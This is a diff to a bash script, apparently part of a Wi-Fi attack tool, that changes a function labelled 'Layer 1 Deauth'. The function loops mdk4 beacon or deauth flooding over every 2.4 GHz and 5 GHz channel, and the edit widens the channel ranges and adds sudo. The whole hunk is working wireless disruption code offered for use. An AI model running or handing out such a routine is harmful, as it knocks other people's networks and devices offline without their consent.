@@ -479,17 +479,15 @@ For_Layer1_Deauth () {
             if [ $band_op == "5G" ]; then
                 echo "starting mdk4 Layer 1 Deauth on 5G"
                 echo "cancel the attack early with ctrl c"
-                for i in (seq 32 157); 
-                do
-                    (mdk4 wlan0 b -c $i)
+                for i in {36..165}; do
+                    sudo mdk4 wlan0 b -c $i -h 5
                 done
-        
+
             elif [ $band_op == "2.4G" ]; then
                 echo "starting mdk4 Layer 1 Deauth on 2.4G"
                 echo "cancel the attack early with ctrl c"
-                for i in $(seq 1 11); 
-                do
-                    (mdk4 wlan0 b -c $i)
+                for i in {1..14}; do
+                    sudo mdk4 wlan0 b -c $i -h 2.4
                 done
             else
                 echo "error, returning"
